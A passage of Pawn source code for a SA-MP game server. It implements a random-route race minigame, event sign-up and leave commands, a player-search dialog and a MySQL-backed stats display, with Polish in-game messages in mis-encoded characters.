	GetPlayerVelocity(playerid, unusedFloat, unusedFloat, z);

	if(GetPlayerCameraMode(playerid) != 4) return 1;
	if(Freezed[playerid]) return 1;
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return 1;
	if(z < -0.01) return 1;
	if(BattleTimer[playerid] > 0) return 1;

    SetPVarInt(playerid,"rsp",gettime()+10);
	return SetTimerEx("respawnPlayer", 100, 0, "i", playerid);
}

forward respawnPlayer(playerid);
public respawnPlayer(playerid)
{
	if(GetPlayerCameraMode(playerid) == 4)
	{
		new Float:p[3], int = GetPlayerInterior(playerid), world = GetPlayerVirtualWorld(playerid), Float:hp[2], Float:v[3], Float:c[3], actual_weapon = GetPlayerWeapon(playerid), w[13], a[13];

		Spawning[playerid] = true;

		GetPlayerCameraPos(playerid, c[0], c[1], c[2]);
		GetPlayerVelocity(playerid, v[0], v[1], v[2]);
		GetPlayerPos(playerid, p[0], p[1], p[2]);

		GetPlayerHealth(playerid, hp[0]);
		GetPlayerArmour(playerid, hp[1]);

		SetPlayerInterior(playerid, int);
		SetPlayerVirtualWorld(playerid, world);
		SetPlayerSkin(playerid, Player[playerid][Skin]);

		Loop(slotid, 13)
		{
			GivePlayerWeapon(playerid, w[slotid], a[slotid]);
		}
		Sound(playerid, 1163, 0.0, 0.0, 0.0);
		SetPlayerPos(playerid, p[0], p[1], p[2]);

		SetPlayerArmedWeapon(playerid, actual_weapon);
		SetPlayerVelocity(playerid, v[0], v[1], v[2]);
		SetPlayerCameraPos(playerid, c[0], c[1], c[2]);
		SetPlayerHealth(playerid, hp[0]);
		SetPlayerArmour(playerid, hp[1]);
		Spawning[playerid] = false;
	}
}

forward RaceUnfreeze();
public RaceUnfreeze()
{
	if(RCTimer > 1)
	{
		Loop(playerid, MAX_PLAYERS)
		{
	    	if(OnGame[playerid] == RC)
	    	{
				PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
				if(RCTimer == 6) GameTextForPlayer(playerid, "~p~~h~5", 1000, 3);
				if(RCTimer == 5) GameTextForPlayer(playerid, "~g~~h~4", 1000, 3);
				if(RCTimer == 4) GameTextForPlayer(playerid, "~b~~h~3", 1000, 3);
				if(RCTimer == 3) GameTextForPlayer(playerid, "~y~~h~2", 1000, 3);
				if(RCTimer == 2) GameTextForPlayer(playerid, "~r~~h~1", 1000, 3);
	    	}
		}
  		return RCTimer--;
	}
	if(RCTimer == 1)
	{
		KillTimer(RCTimerSet);
		Loop(playerid, MAX_PLAYERS)
		{
	    	if(OnGame[playerid] == RC)
	    	{
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				TogglePlayerControllable(playerid, 1);
  				rcstarttick = GetTickCount();
	    	}
		}
  		return RCTimer--;
	}
	return 1;
}

forward RC_Start();
public RC_Start()
{
	if(Osoby[RC] < Min[RC])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == RC) OnGame[playerid] = -1; }
	    Startuje[RC] = false;
 	    return RefreshZabawy();
	}
	Wystartowala[RC] = true;
	Startuje[RC] = false;
	RCPlace = 0;
	RCPlayers = 0;
	switch(random(7))
	{
	    case 0:
	    {
	        RaceID = 0;
	        format(RCName, sizeof(RCName), "Infernus LV");
	        RCSpawnX = 1932.8439;
	        RCSpawnY = 633.2301;
	        RCSpawnZ = 10.3912;
	        new Float:RCSpawnA = 90.2686;
	        RCCar = 411;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
	        		ForceObj(playerid);
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,0,1881.9294,633.2802,10.6719,1867.3853,758.3105,10.6719,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
	    case 1:
	    {
	        RaceID = 1;
	        format(RCName, sizeof(RCName), "Verona Bullet");
	        RCSpawnX = 1284.6448;
	        RCSpawnY = -1712.2631;
	        RCSpawnZ = 13.0077;
	        new Float:RCSpawnA = 90.9846;
	        RCCar = 541;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,0,1052.6758,-1712.2848,13.3828,1035.0684,-1788.4596,13.6272,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
	    case 2:
	    {
	        RaceID = 2;
	        format(RCName, sizeof(RCName), "San Turismo");
	        RCSpawnX = -2606.7271;
	        RCSpawnY = 484.4828;
	        RCSpawnZ = 14.1682;
	        new Float:RCSpawnA = 180.2483;
	        RCCar = 451;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,0,-2606.6570,363.4665,4.8394,-2542.4004,340.4751,19.7831,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
	    case 3:
	    {
	        RaceID = 3;
	        format(RCName, sizeof(RCName), "Doherty-500");
	        RCSpawnX = -1962.2633;
	        RCSpawnY = 137.7654;
	        RCSpawnZ = 27.2606;
	        new Float:RCSpawnA = 89.3120;
	        RCCar = 522;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,0,-2037.1083,135.8837,28.8359,-2212.3862,103.9499,35.3203,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
	    case 4:
	    {
	        RaceID = 4;
	        format(RCName, sizeof(RCName), "Kart Street");
	        RCSpawnX = 2490.9727;
	        RCSpawnY = -1659.6869;
	        RCSpawnZ = 12.6806;
	        new Float:RCSpawnA = 91.1992;
	        RCCar = 571;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,0,2449.8206,-1714.0190,13.6882,2482.1011,-1691.8477,13.5148,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
      case 5:
	    {
	        RaceID = 5;
	        format(RCName, sizeof(RCName), "Sultan LV");
	        RCSpawnX = 2048.6221;
	        RCSpawnY = 1202.1445;
	        RCSpawnZ = 10.3772;
	        new Float:RCSpawnA = 179.5163;
	        RCCar = 560;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,0,2048.5762,996.7083,10.3760,2270.4824,973.2679,10.3770,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
      case 6:
	    {
	        RaceID = 6;
	        format(RCName, sizeof(RCName), "Rustler Race");
	        RCSpawnX = -2296.4189;
	        RCSpawnY = -1635.5571;
	        RCSpawnZ = 484.4787;
	        new Float:RCSpawnA = 345.8529;
	        RCCar = 476;
	        RCTimer = 6;
			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == RC)
			    {
			        RCPlayers++;
			        ResetPlayerWeapons(playerid);
			        SetPlayerVirtualWorld(playerid, 40);
					DisableRemoteVehicleCollisions(playerid, 1);
					RCVehicle[playerid] = CreateVehicle(RCCar, RCSpawnX, RCSpawnY, RCSpawnZ, RCSpawnA, random(300), random(300), -1);
					SetVehicleVirtualWorld(RCVehicle[playerid], 40);
					AddVehicleComponent(RCVehicle[playerid], 1010);
					SetVehicleNumberPlate(RCVehicle[playerid], "{6ba7d6}Impreza");
					PutPlayerInVehicle(playerid, RCVehicle[playerid], 0);
					TogglePlayerControllable(playerid, 0);
					RCCheckpoint[playerid] = 0;
					SetPlayerRaceCheckpoint(playerid,3,-1989.7114,-845.3229,55.5152,-1944.8483,-403.3777,33.2410,4);
					new rcinfostr[256];
					format(rcinfostr, sizeof(rcinfostr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] {F5F96B}Wylosowana trasa: "C_WHITE"%s {F5F96B}autorstwa "C_WHITE"critical{F5F96B}. ("C_WHITE"%d{F5F96B})", RCName, RaceID);
					SendClientMessage(playerid, -1, rcinfostr);
					PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
					GameTextForPlayer(playerid, "~b~~h~6", 1000, 3);
				}
			}
			RCTimerSet = SetTimer("RaceUnfreeze", 1000, 1);
	    }
	}
	RefreshZabawy();
	return 1;
}

forward RC_End();
public RC_End()
{
	KillTimer(RCEnding);
	Startuje[RC] = false;
	Osoby[RC] = 0;
	Wystartowala[RC] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == RC) {
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	    	DestroyVehicle(RCVehicle[playerid]);
	   		ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	RefreshZabawy();
	return 1;
}

CMD:leave(playerid, params[])
{
	if(EVUczestnik[playerid]) WypiszZabawa(playerid);
	if(NaNurku[playerid]) return EndNurek(playerid);
	if(OnGame[playerid] == -1 && pArena[playerid] == 0) return SendClientMessage(playerid, RED, "Nie bierzesz udzia³u w ¿adnej zabawie.");
	else {
		if(pArena[playerid] > 0)
		{
			RemoveFromArena(playerid);
  			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 100.0);
			pArena[playerid] = 0;
			SetPlayerInterior(playerid, 0);
			SpawnFunction(playerid);
			RefreshAreny();
			return 1;
		}
		WypiszZabawa(playerid);
		SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Zosta³eœ wypisany z zabawy."); }
	return 1;
}

forward FuncPart2(playerid);
public FuncPart2(playerid)
{
    ccount[0][playerid] = 0; ccount[1][playerid] = 0; ccount[2][playerid] = 0; ccount[3][playerid] = 0;
    ResetPlayerWeapons(playerid);
        GivePlayerWeapon(playerid, 24, 7);
}

CMD:glitch(playerid, params[]) return cmd_cbug(playerid, params);
CMD:gl(playerid, params[]) return cmd_cbug(playerid, params);
CMD:cbug(playerid, params[])
{
    ccount[0][playerid] = 0; ccount[1][playerid] = 0; ccount[2][playerid] = 0; ccount[3][playerid] = 0;
    isCbug[playerid] = 1;
    SetPlayerPos(playerid, 1351.6174, 2183.8823, 11.0234);
	SetPlayerVirtualWorld(playerid, 46 + playerid);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 24, 7);
    SetPlayerHealth(playerid, 9999.0);
    return 1;
}

CMD:players(playerid, params[])
{
	new dialogstr[2048];
	if(isnull(params))
	{
	    format(dialogstr, sizeof(dialogstr), ""C_BLUE1"Za pomoc¹ tego panelu mo¿esz wyszukaæ gracza z bazy danych oraz sprawdziæ jego statystyki.\n\n");
 	    format(dialogstr, sizeof(dialogstr), "%s"C_BLUE1"Aktualny tryb wyszukiwania: "C_WHITE"Normalny\n\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_BLUE1"W panelu tym dostêpne jest kilka trybów wyszukiwania:\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players "C_WHITE"- "C_BLUE1"Tryb normalny. Wyszukuje gracza bez ¿adnych kryteriów.\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players p "C_WHITE"- "C_BLUE1"Tryb prywatnego pojazdu. Wyszukuje gracza po ID modelu posiadanego pojazdu.\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players ip "C_WHITE"- {FF0000}Tryb administratora. Wyszukuje graczy po adresie IP.\n", dialogstr);
 	    return ShowPlayerDialog(playerid, DIALOG_PLAYER, DIALOG_STYLE_INPUT, ""C_BLUE1"Wyszukiwanie graczy", dialogstr, "Wyszukaj", "Zamknij");
	}
	if(CompareEx(params, "p"))
	{
	    format(dialogstr, sizeof(dialogstr), ""C_BLUE1"Za pomoc¹ tego panelu mo¿esz wyszukaæ gracza z bazy danych oraz sprawdziæ jego statystyki.\n\n");
 	    format(dialogstr, sizeof(dialogstr), "%s"C_BLUE1"Aktualny tryb wyszukiwania: "C_WHITE"Prywatny pojazd\n\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_BLUE1"W panelu tym dostêpne jest kilka trybów wyszukiwania:\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players "C_WHITE"- "C_BLUE1"Tryb normalny. Wyszukuje gracza bez ¿adnych kryteriów.\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players p "C_WHITE"- "C_BLUE1"Tryb prywatnego pojazdu. Wyszukuje gracza po ID modelu posiadanego pojazdu.\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players ip "C_WHITE"- {FF0000}Tryb administratora. Wyszukuje graczy po adresie IP.\n", dialogstr);
 	    return ShowPlayerDialog(playerid, DIALOG_PLAYERP, DIALOG_STYLE_INPUT, ""C_BLUE1"Wyszukiwanie graczy", dialogstr, "Wyszukaj", "Zamknij");
	}
	if(CompareEx(params, "ip"))
	{
	    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	    format(dialogstr, sizeof(dialogstr), ""C_BLUE1"Za pomoc¹ tego panelu mo¿esz wyszukaæ gracza z bazy danych oraz sprawdziæ jego statystyki.\n\n");
 	    format(dialogstr, sizeof(dialogstr), "%s"C_BLUE1"Aktualny tryb wyszukiwania: {FF0000}Tryb administratora\n\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_BLUE1"W panelu tym dostêpne jest kilka trybów wyszukiwania:\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players "C_WHITE"- "C_BLUE1"Tryb normalny. Wyszukuje gracza bez ¿adnych kryteriów.\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players p "C_WHITE"- "C_BLUE1"Tryb prywatnego pojazdu. Wyszukuje gracza po ID modelu posiadanego pojazdu.\n", dialogstr);
 	    format(dialogstr, sizeof(dialogstr), "%s"C_YELLOW"/players ip "C_WHITE"- {FF0000}Tryb administratora. Wyszukuje graczy po adresie IP.\n", dialogstr);
 	    return ShowPlayerDialog(playerid, DIALOG_PLAYERIP, DIALOG_STYLE_INPUT, ""C_BLUE1"Wyszukiwanie graczy", dialogstr, "Wyszukaj", "Zamknij");
	}
	return 1;
}

CMD:staty(playerid, params[]) return cmd_mystats(playerid, params);
CMD:mystats(playerid, params[])
{
	new nickstr[128], statsstr[4096], sqlquery[1024], sqlquery2[1024];
	new id, user[20], kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[8], czat, solo, potwory, zabawy, visits, cbug, questy, house;
	m_query("SELECT id, username, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a1, a2, a3, a4, a5, a6, a7, a8, czat, solo, potwory, zabawy, visits, cbug, questy, house FROM players WHERE playerid = %d", playerid);
	mysql_store_result();
	mysql_fetch_row(sqlquery, " ");
	mysql_free_result();
	sscanf(sqlquery, "is[20]iiiiiiiiiiiiiiiiiiiiiiifii", id, user, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], czat, solo, potwory, zabawy, visits, cbug, questy, house);
	format(nickstr, sizeof(nickstr), ""C_BLUE1"%s "C_WHITE"("C_BLUE1"UID %d"C_WHITE")", user, id);
	format(statsstr, sizeof(statsstr), ""C_WHITE"%d "C_BLUE1"EXP ("C_WHITE"%d"C_BLUE1"), "C_WHITE"%d"C_BLUE1"$\n", exp, level, waluta);
	if(vip > gettime()) format(statsstr, sizeof(statsstr), "%s"C_YELLOW"Posiada uprawnienia VIP\n", statsstr);
	if(rank == 0 && vip < gettime()) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "C_WHITE"Gracz\n", statsstr);
	if(rank == 1) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "JUNIOR"\n\n", statsstr);
	if(rank == 2) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "ADMIN"\n\n", statsstr);
	if(rank == 3) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "VHA"\n\n", statsstr);
	if(rank == 4) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "HA"\n\n", statsstr);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa/Zgony: "C_WHITE"%d/%d\n", statsstr, kills, deaths);
	format(statsstr, sizeof(statsstr), "%s{FF2600}Poziom ostrze¿eñ: %d{E50000}/{FF2600}100\n\n", statsstr, warny);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ogólny czas gry: "C_WHITE"%d"C_BLUE1"h "C_WHITE"%d"C_BLUE1"m\n", statsstr, hours, minutes);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wizyty na serwerze: "C_WHITE"%d\n\n", statsstr, visits);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ukoñczone wyzwania Reflex: "C_WHITE"%d\n", statsstr, czat);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane zabawy: "C_WHITE"%d\n", statsstr, zabawy);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa na arenach: "C_WHITE"%d, %d, %d, %d, %d, %d, %d, %d\n", statsstr, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane walki solo: "C_WHITE"%d\n", statsstr, solo);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Najszybszy czas glitch: "C_WHITE"%0.4fs\n\n", statsstr, cbug);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Z³apane potwory: "C_WHITE"%d\n", statsstr, potwory);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wykonane questy: "C_WHITE"%d\n\n", statsstr, questy);
	if(house > -1) format(statsstr, sizeof(statsstr), "%s"C_GREEN"Posiada dom o ID "C_WHITE"%d"C_GREEN".\n", statsstr, house);
	m_query("SELECT modelid, dist FROM privcars WHERE ownerid = %d", Player[playerid][ID]);
	mysql_store_result();
	if(mysql_num_rows() > 0) {
		mysql_fetch_row(sqlquery2, " ");
		mysql_free_result();
		new model, Float:distance;
		sscanf(sqlquery2, "if", model, distance);
		format(statsstr, sizeof(statsstr), "%s{CD82F5}Posiada prywatny pojazd "C_NICK"%s "C_YELLOW"(%.1fkm)\n\n", statsstr, VehicleNames[model - 400], distance); }
	mysql_free_result();
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, nickstr, statsstr, "Zamknij", "");
}

CMD:race(playerid, params[]) return cmd_rc(playerid, params);
CMD:rc(playerid, params[])
{
	if(!Startuje[RC]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[RC]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[RC] >= Max[RC]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == RC) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = RC;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/RC"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:ch(playerid, params[])
{
	if(!Startuje[CH]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[CH]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[CH] >= Max[CH]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == CH) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = CH;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/CH"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:rk(playerid, params[])
{
	if(!Startuje[RK]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[RK]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[RK] >= Max[RK]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == RK) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = RK;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/RK"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:sp(playerid, params[])
{
	if(!Startuje[SP]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[SP]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[SP] >= Max[SP]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == SP) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = SP;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/SP"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:derby(playerid, params[]) return cmd_db(playerid, params);
CMD:db(playerid, params[])
{
	if(!Startuje[DB]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
